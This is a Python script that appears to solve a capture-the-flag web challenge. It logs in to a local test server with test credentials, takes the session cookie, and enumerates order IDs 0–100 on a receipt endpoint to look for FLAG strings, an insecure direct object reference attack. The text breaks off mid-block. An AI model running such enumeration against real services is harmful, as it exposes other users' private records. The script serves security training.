import requests
import re

# Configuration
base_url = "http://127.0.0.1:32941"
auth_username = "test"
auth_password = "test"
user_id = "10032"

# Step 1: First authentication step
print("[*] Step 1: POST username to /")
step1_response = requests.post(
    f"{base_url}/",
    data={"username": auth_username},
    allow_redirects=False
)
print(f"[+] Step 1 Response: Status={step1_response.status_code}")
print(f"[+] Step 1 Headers: {dict(step1_response.headers)}")

# Step 2: Second authentication step
print("\n[*] Step 2: POST username, user_id, password to /password/test")
step2_response = requests.post(
    f"{base_url}/password/test",
    data={
        "username": auth_username,
        "user_id": user_id,
        "password": auth_password
    },
    allow_redirects=False
)
print(f"[+] Step 2 Response: Status={step2_response.status_code}")
print(f"[+] Step 2 Headers: {dict(step2_response.headers)}")

# Extract session cookie
session_cookie = None
if 'Set-Cookie' in step2_response.headers:
    cookie_header = step2_response.headers['Set-Cookie']
    if 'session=' in cookie_header:
        session_value = cookie_header.split('session=')[1].split(';')[0]
        session_cookie = f"session={session_value}"
        print(f"[+] Extracted Session Cookie: {session_cookie}")
    else:
        print("[!] Could not find session cookie in Set-Cookie header")
else:
    print("[!] No Set-Cookie header in step 2 response")

if not session_cookie:
    print("[!] Authentication failed - could not obtain session cookie")
    exit(1)

# Now enumerate order IDs
print(f"\n[*] Starting enumeration of order_id values 0-100")
print("[*] Target endpoint: /order/{order_id}/receipt")
print("-" * 60)

found_flags = []
anomalies = []
success_count = 0
not_found_count = 0

headers = {
    "Cookie": session_cookie
}

for order_id in range(0, 101):
    url = f"{base_url}/order/{order_id}/receipt"
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
        
        # Check for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            found_flags.append({
                'order_id': order_id,
                'flags': flag_matches,
                'status': response.status_code
            })
            print(f"[!] FLAG FOUND at order_id={order_id}")
            print(f"    Status: {response.status_code}")
            print(f"    Flags: {flag_matches}")
            print(f"    Response (first 500 chars): {response.text[:500]}")
        
        # Check for anomalies (non-404 responses without FLAG)
        elif response.status_code != 404:
            anomalies.append({
                'order_id': order_id,
                'status': response.status_code,
                'content_length': len(response.content),
                'response_preview': response.text[:200]
            })
            print(f"[+] ANOMALY at order_id={order_id}")
            print(f"    Status: {response.status_code} | Length: {len(response.content)}B")
            print(f"    Response: {response.text[:200]}")
        
        # Count success vs 404
        if response.status_code == 200:
            success_count += 1
        elif response.status_code == 404:
            not_found_count += 1
            
    except Exception as e:
        print(f"[!] Error at order_id={order_id}: {str(e)}")

print("\n" + "=" * 60)
print("ENUMERATION SUMMARY")
print("=" * 60)
print(f"Total order IDs tested: 101 (0-100)")
print(f"Successful (200 OK): {success_count}")
print(f"Not Found (404): {not_found_count}")
print(f"Anomalies found: {len(anomalies)}")
print(f"Flags found: {len(found_flags)}")

if found_flags:
    print("\n[!] FLAGS FOUND:")
    for item in found_flags:
        print(f"  order_id {item['order_id']}: {item['flags']}")

if anomalies:
    print(f"\n[!] ANOMALIES DETECTED (non-404 responses):")
    for anomaly in anomalies:
        print(f"  order_id={anomaly['order_id']} | Status={anomaly['status']} | Length={anomaly['content_length']}B")
        if 'flag' in anomaly['response_preview'].lower() or 'FLAG' in anomaly['response_preview']:
            print(f"    Response: {anomaly['response_preview']}")

if not found_flags and not anomalies:
    print("\n[*] No flags or anomalies found in range 0-100")
    print("[*] Consider expanding the search range or checking for obfuscation")

# Also check if we have a valid session by testing with no order_id
print("\n[*] Testing base /order/ endpoint (no ID)")
try:
